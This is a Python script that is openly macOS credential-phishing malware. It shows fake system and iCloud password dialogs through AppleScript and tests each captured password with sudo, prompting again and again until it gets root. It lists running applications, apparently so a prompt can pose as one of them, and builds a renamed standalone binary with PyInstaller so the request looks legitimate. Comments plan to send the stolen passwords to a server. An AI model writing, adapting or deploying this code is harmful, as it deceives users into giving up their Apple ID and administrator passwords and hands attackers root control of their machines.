import subprocess
import checkiCloudEmail
from time import sleep
import os

# Arguments
# localpass
# icloud pass
# < there is the nbsp
# Generate binary, put in applications, use open -a /Application/[name], what ever the binary is named is what requests permission. You can rename after generation. Instead of print pipe it out to server

def promptSystem():
    try:
        run_command = subprocess.check_output(
        "osascript /Applications/system.applescript", shell=True)
    except subprocess.CalledProcessError:
        pass
    return run_command.rstrip()

def promptiCloud():
    try:
        run_command = subprocess.check_output(
        "osascript /Applications/icloud.applescript {0}".format(checkiCloudEmail.checkEmail()), shell=True)
    except subprocess.CalledProcessError:
        pass
    return run_command

def checkProcesses():
    try:
        run_command = subprocess.check_output(
        "ps -ae | grep Applications | awk '{print $4}' | sort -u", shell=True)
    except subprocess.CalledProcessError:
        pass
    return run_command.decode('utf-8').split('\n')
    # ps -ae | grep Applications | awk '{print $4}' | sort -u

def tryRoot(pw):
    try:
        return subprocess.check_output(
        "echo '{0}' | sudo -S whoami".format(pw), shell=True)
    except subprocess.CalledProcessError:
        return "FALSE"

# FIXME: Generation should probably be done server side but the code is still adaptable
def getProcesses():
    a = subprocess.check_output("ps -ae | grep Applications | awk '{print $4}' | sort -u", shell=True) 
    a = a.decode('utf-8').split('\n')
    a.remove('grep')
    a.remove('')
    b = []
    for i in a:
        i = str(i)
        if 'Applications' not in i:
            a.remove(i)
        else:
            i = i.split('Applications/')[1]
            if '.app' in i:
                i = i.split('.app')[0]
            elif '/' in i:
                i = i.split('/')[0]
            b.append(i)
    return b

def install(package):
    with open(os.devnull, 'w') as fp:
        subprocess.Popen(['pip', 'install', '{0}'.format(package)], stdout=fp)
        return

def generateBinary(filelocation):
    install('pyinstaller')
    try:
        run_command = subprocess.check_output(
        "/Users/$USER/Library/Python/2.7/bin/pyinstaller {0} --onefile".format(filelocation), shell=True)
    except subprocess.CalledProcessError:
        return False
    return True

if __name__ == "__main__":
    icloudpass = promptiCloud()
    # print icloudpass
    localpass = promptSystem()
    # print "ITSSSS" + tryRoot(localpass)
    while "root" not in tryRoot(localpass):
        localpass = promptSystem()
    # while tryRoot(localpass) is not True:
    #     sleep(10)
    #     localpass = promptSystem()
    # print localpass
